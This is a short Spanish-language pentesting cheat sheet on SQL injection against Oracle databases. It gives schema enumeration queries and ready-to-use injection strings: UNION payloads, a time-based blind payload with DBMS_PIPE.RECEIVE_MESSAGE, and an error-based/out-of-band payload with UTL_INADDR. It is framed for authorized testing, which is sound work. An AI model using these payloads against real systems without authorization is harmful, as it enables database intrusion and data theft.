# SQLi — Oracle

Ver índice: [sqli.md](sqli.md). **Solo sobre objetivos autorizados.**

## Peculiaridades

- Todo `SELECT` necesita un `FROM` → usa la tabla ficticia `DUAL`.
- Comentario `-- ` y `/* */`.

## Info básica

```sql
SELECT banner FROM v$version;
SELECT user FROM dual;
SELECT global_name FROM global_name;
```

## Concatenación

```sql
'a' || 'b'        CONCAT(a,b)
```

## Enumeración del esquema

```sql
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```

## Union (recuerda DUAL / número de columnas)

```sql
' UNION SELECT NULL FROM dual-- -
' UNION SELECT banner,NULL FROM v$version-- -
```

## Blind — time-based

```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)-- -
```

## Error-based / OOB

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -   -- OOB/errores
```

## Notas

- Nombres de tablas/columnas suelen ir en MAYÚSCULAS.
- Las funciones de red (UTL_HTTP/UTL_INADDR) sirven para OOB si están permitidas.
